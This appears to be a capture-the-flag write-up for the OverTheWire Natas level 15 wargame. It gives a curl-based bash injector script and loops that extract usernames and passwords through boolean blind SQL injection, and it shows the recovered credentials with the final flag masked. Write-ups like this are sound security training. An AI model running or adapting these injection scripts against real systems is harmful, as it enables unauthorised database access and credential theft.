# NATAS

**https://overthewire.org/wargames/natas/natas0.html**

### Natas15

**First, let's get our injector going. Just the curl with the data from the post prepared:**

cat injector.sh
>#!/bin/bash  
>  
>DATA=$1  
>  
>curl -s 'http://natas15.natas.labs.overthewire.org/index.php' -H 'Authorization: Basic XXXXXXXXXXXXXXXXXXXXXXXXXXX' -H 'Cookie: __cfduid=XXXXXXXXXXXXXXXXXXXXX' -H 'Host: natas15.natas.labs.overthewire.org' -H 'Referer: http://natas15.natas.labs.overthewire.org/index.php' --data "username=testssdf\" or $DATA" | grep -c "This user exists"  

Then, let's start injecting:

USER=0;for j in {0..3}; do for((h=1;h<=10;h++)); do RES=$(./injector.sh "(select length(username) from users limit $USER,1)=%22$h"); if [[ $RES == 1 ]]; then L=$h; fi; done; echo -n "[+]Found user $USER: "; for((t=1;t<=$L;t++)); do for i in {32..126}; do RES2=$(./injector.sh "(select ascii(substr(username,$t,1)) from users limit $USER,1)=%22$i"); if [[ $RES2 == 1 ]]; then printf \\$(printf '%03o\n' "$i"); fi; done;done;echo "";  USER=$(echo $USER+1 | bc); done
[+]Found user 0: alice
[+]Found user 1: bob
[+]Found user 2: charlie
[+]Found user 3: natas16

USER=0;for j in {0..3}; do for((h=1;h<=10;h++)); do RES=$(./injector.sh "(select length(password) from users limit $USER,1)=%22$h"); if [[ $RES == 1 ]]; then L=$h; fi; done; echo -n "[+]Found password $USER: "; for((t=1;t<=$L;t++)); do for i in {32..126}; do RES2=$(./injector.sh "(select ascii(substr(password,$t,1)) from users limit $USER,1)=%22$i"); if [[ $RES2 == 1 ]]; then printf \\$(printf '%03o\n' "$i"); fi; done;done;echo "";  USER=$(echo $USER+1 | bc); done
>[+]Found password 0: hROtsfM734  
>[+]Found password 1: 6P151OntQe  
>[+]Found password 2: HLwuGKts2w  
>[+]Found password 3: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX **<- No spoils ^^ **   
